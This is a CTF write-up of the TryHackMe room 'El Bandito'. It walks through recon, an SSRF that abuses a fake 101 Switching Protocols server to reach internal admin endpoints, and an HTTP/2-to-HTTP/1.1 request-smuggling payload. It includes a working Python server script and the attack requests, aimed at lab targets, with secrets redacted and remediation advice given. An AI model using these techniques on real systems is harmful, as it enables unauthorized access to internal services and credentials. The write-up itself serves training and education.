# 🏴‍☠️ TryHackMe: El Bandito  
**Difficulty:** 🔴 Hard  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/elbandito)

> **Disclaimer:**  
> This write-up is for educational and professional demonstration purposes only.  
> All testing was performed in a controlled, authorized environment (TryHackMe).  
> No techniques described here were used against real-world systems.

### About This Write-Up
This document is part of my offensive security portfolio.  
My goal is to present structured, professional case studies that demonstrate practical penetration testing skills, clear reporting, and a real-world methodology.

---

## 🧠 Summary
**El Bandito** is an advanced web exploitation challenge focused on chaining multiple vulnerabilities to bypass proxy restrictions and access internal endpoints.  
The exploitation path involves an **SSRF via WebSocket interaction**, followed by a **rare HTTP/2 → HTTP/1.1 downgrade desynchronization attack (H2.CL request smuggling)**.

**Key themes:**
- Reconnaissance & directory enumeration  
- SSRF + WebSocket chaining  
- Proxy bypass & internal endpoint discovery  
- HTTP/2 → HTTP/1.1 downgrade exploit (request smuggling)  
- Flag extraction through advanced desync techniques  

---

## 🧰 Tools & Techniques

| ⚙️ Tool / Technique | 📌 Purpose |
|---------------------|------------|
| **nmap** | Port scanning & service discovery |
| **Gobuster** | Directory and endpoint enumeration |
| **Burp Suite** | Proxy interception, header manipulation, HTTP/2 testing |
| **Python HTTP server** | Custom 101 Switching Protocols server for SSRF |
| **WebSocket analysis** | Understanding proxy behavior |
| **H2.CL exploitation techniques** | Testing downgrade-based request smuggling |

---

## 🚀 Attack Path

### 1. 🔎 Recon with nmap
```bash
nmap -sV -p- -T4 10.10.73.22
```

| Port     | Service | Notes               |
| -------- | ------- | ------------------- |
| 22/tcp   | SSH     | OpenSSH 8.2p1       |
| 80/tcp   | HTTPS   | “El Bandito Server” |
| 631/tcp  | IPP     | CUPS 2.4            |
| 8080/tcp | HTTP    | nginx API           |

---

### 2. 📜 Initial Webroot Reconnaissance

**Visit:** `https://10.10.73.22:80/`  
**Output:** `nothing to see here`

**Interesting asset:**
```html
<script src='/static/messages.js'></script>
```

Key findings in `messages.js`:
- Client-side chat system with two static users (Jack & Oliver)
- Weak rendering logic displaying whole objects instead of message text
- Bot triggers based on URL parameters
- Lack of proper error handling
- Possible vectors: client-side manipulation, WebSocket behavior abuse, SSRF triggers

---

### 3. 📂 Directory brute-forcing

```bash
gobuster dir -u https://10.10.73.22:80 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

| Path        | Status  | Notes           |
| ----------- | ------- | --------------- |
| `/access`   | 200     | Login area      |
| `/messages` | 302     | Related to chat |
| `/ping`     | 200     | Health check    |
| `/static/`  | 301/200 | Static assets   |

**Other findings:**

Most of the additional paths returned **405** or **403**, indicating that many admin or internal routes are restricted (potentially only accessible through internal references or via SSRF).

The directories `/static/` and `/access` appear to be useful entry points for further analysis, as they may contain JavaScript files, client-side logic, or hidden references.

---

### 4. 🔍 8080-port enumeration

```bash
gobuster dir -u http://10.10.73.22:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

| Path       | Status | Notes                 |
| ---------- | ------ | --------------------- |
| `/info`    | 200    | System information    |
| `/token`   | 200    | Token API             |
| `/admin`   | 403    | Admin-only            |
| `/env`     | 403    | Environment variables |
| `/metrics` | 403    | Monitoring endpoint   |

**Observations:**
- Many paths returned **403 Forbidden**, indicating that numerous admin/diagnostic endpoints are restricted from external requests.
- The presence of `/info` and `/token` returning status 200 is noteworthy — these may be low-barrier API or health endpoints that reveal useful information or behavior.
- The pattern (numerous JavaScript/API-related paths) suggests the presence of an internal service API or proxy layer — a strong candidate for SSRF or proxy-bypass testing.

---

### 5. 🧩 Identifying WebSocket + SSRF Behavior

Upon inspecting `http://10.10.73.22:8080/burn.html`, it was observed that the WebSocket was not functioning correctly. The JavaScript in the page source confirms that burn.html was meant to use a WebSocket for token burning. The functionality was intentionally disabled, but the implementation revealed how service‑reachability checks were performed—an important clue for discovering SSRF behavior.

After examining `http://10.10.73.22:8080/services.html`, the webpage displayed a list of services:
- http://bandito.websocket.thm: OFFLINE
- http://bandito.public.thm: ONLINE

**Intercept (Burp Suite):**
```http
GET /isOnline?url=http://bandito.public.thm HTTP/1.1
Host: 10.10.73.22:8080
```
Test for SSRF behavior (simple listener):
```bash
# start a simple HTTP server on your attack box
python3 -m http.server 8000
```
Test request to the server (via Burp/proxy):
```http
GET /isOnline?url=http://<your-attackbox-ip>:8000 HTTP/1.1
Host: 10.10.73.22:8080
```

**Observation / conclusion:**
- The server made an outbound HTTP request to the supplied URL, and your simple HTTP server received the request → this confirms that the isOnline endpoint exhibits SSRF-like behavior (the server can reach external URLs).
- This opens the door for further exploitation: internal endpoints (403), admin routes, or health-check paths that are not directly accessible externally may be reachable through this SSRF vector.
- Since the UI includes WebSocket-related elements (though not functioning properly), it is reasonable to investigate whether the SSRF can be combined with a WebSocket upgrade or proxy misdirection to access internal admin endpoints.

---

### 6. 🧠 Exploiting SSRF via 101 Switching Protocols

To trick the proxy and simulate a WebSocket upgrade, I created a small custom Python HTTP server that returns a `101 Switching Protocols` response.

**Python script (`server.py`):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"
        self.send_response(101)
        self.end_headers()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 server.py <port>")
        sys.exit(1)
    HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
**Start the server:**
```bash
python3 server.py 9000
```

**Trigger SSRF to your server (via the `isOnline` endpoint):**
```http
GET /isOnline?url=http://10.10.26.22:9000 HTTP/1.1
Host: 10.10.169.87:8080
```

**Observation:** the proxy responded with:
```bash
101 Switching Protocols
```
After the successful 101 response, additional traffic to internal endpoints could be performed, for example:
```http
GET /trace HTTP/1.1
Host: 10.10.169.87:8080
```

**Conclusion / notes:**
- By returning a `101 Switching Protocols` response, the proxy may assume that a WebSocket upgrade has taken place, allowing it to forward or permit additional internal requests.
- This is a powerful technique for gaining access to internal/forbidden endpoints that are normally not directly reachable from the outside.
- Note: only use such techniques in authorized lab or CTF environments.

This type of SSRF–WebSocket chaining is uncommon because it requires a misconfigured proxy that incorrectly trusts upgrade responses. When present, however, it can completely break network isolation.

---

### 7. 🔓 Admin Credentials & Flag 1

Through the SSRF response, admin credentials and the first flag were disclosed.

**Obtained admin credentials (via SSRF):**
```http
GET /admin-creds HTTP/1.1
Host: 10.10.169.87:8080
```

**Credentials obtained:**
```makefile
username: hAckLIEN
password: [REDACTED]
```

**Then requested (flag endpoint):**
```http
GET /admin-flag HTTP/1.1
Host: 10.10.169.87:8080
```
**Retrieved Flag:**
```text
THM{REDACTED}
```

**Login (web):**
```arduino
https://10.10.73.22/access
```

**Impact:**
The leaked credentials granted direct access to the administrative interface, effectively bypassing all authentication controls. Anyone able to trigger the SSRF endpoint could gain full system access.

**Remediation:**
Implement strict allowlisting for all outbound requests, disable dynamic URL fetching entirely, and prevent 101 responses from being forwarded unless the connection originates from approved WebSocket routes.

---

### 8. 💥 Flag 2 — HTTP/2 Request Smuggling (H2.CL)

During communication after logging in, traffic was observed being sent over **HTTP/2**:

POST /send_message HTTP/2

#### Testing for a possible downgrade (HTTP/2 → HTTP/1.1)
- Add a **malformed `Content-Length`** header to an HTTP/2 request.  
- In Burp Suite, disable the **"Update Content-Length"** option so that Burp does not correct the header.  
- If the proxy downgrades the request to HTTP/1.1 and the backend processes the (incorrect) `Content-Length`, a **desynchronization (H2.CL)** can occur — causing the embedded extra data to be interpreted as a new request.

```scss
Client (HTTP/2)
        ↓
Frontend Proxy (H2 → H1 downgrade)
        ↓
Backend Server (HTTP/1.1 only)
        ↓
Desync caused by conflicting Content-Length
```

**Technical observation:**  
HTTP/2 normally ignores `Content-Length` headers; an error in response to such a header suggests that the frontend proxy downgraded the H2 request to H1 (where `Content-Length` **is** honored).

**Why Varnish is relevant:**  
Since Varnish cannot natively process HTTP/2, the deployment relied on a translating proxy. These downgrade layers are known to introduce inconsistencies in header handling, making them susceptible to desynchronization.

#### Example of a smuggle payload (conceptual / anonymized)
```http
POST /send_message HTTP/2
Content-Length: 0

POST /send_message HTTP/1.1
Host: [REDACTED]
Content-Length: 700
data=
```
**Followed by:**
```http
GET /getMessages HTTP/2
```

**Result during testing:**  
Refreshing `/getMessages` produced several `null entries` — indicating that the backend interpreted the payload structure differently and that the desynchronization succeeded.

**Retrieved flag:**
```text
THM{Redacted}
```
**Conclusion**
In this architecture, the frontend accepted HTTP/2 but the backend (like Varnish or another H1‑only service) required HTTP/1.1. This mismatch made the system vulnerable to H2.CL desynchronization, one of the rarest but most impactful forms of request smuggling.

---

## Flags found

| 🏷️ Flag   | Technique                         | Impact                     | Value        |
| ---------- | ---------------------------------|--------------------------- | -------------|
| Admin Flag | SSRF + WebSocket chaining        |Full access to internal API | `THM{REDACTED}` |
| Chat Flag  | HTTP/2 → HTTP/1.1 H2.CL Smuggling|Request desync → backend code execution path | `THM{REDACTED}` |

---

## Room links

📸 [screenshots](../../challenges/thm-el-bandito/screenshots.md)

🔗 [TryHackMe - El bandito](https://tryhackme.com/room/elbandito)

---

## 💭 Reflection

This room combines multiple layers of web exploits into a single attack path:

- **SSRF exploitation** through WebSocket upgrade headers.  
- **Proxy deception** by returning a `101 Switching Protocols` response.  
- **HTTP/2 → HTTP/1.1 downgrade** (H2.CL desynchronization) — rare but powerful, especially when combined with Varnish-based caching layers.

### Key Takeaways
- Proxies are often the weakest link between layers — misconfigurations or incorrect protocol conversions can open the door to complex attack chains.  
- HTTP standards and implementations are not always applied correctly; this enables advanced techniques such as request smuggling.  
- Patience, systematic testing, and experimentation are essential for this type of lab — try small variations and log everything carefully.

### Lessons Learned
- Protocol downgrade paths should be audited explicitly.
- WebSocket upgrade flows require strict validation.
- SSRF is more dangerous when combined with protocol-level behavior.
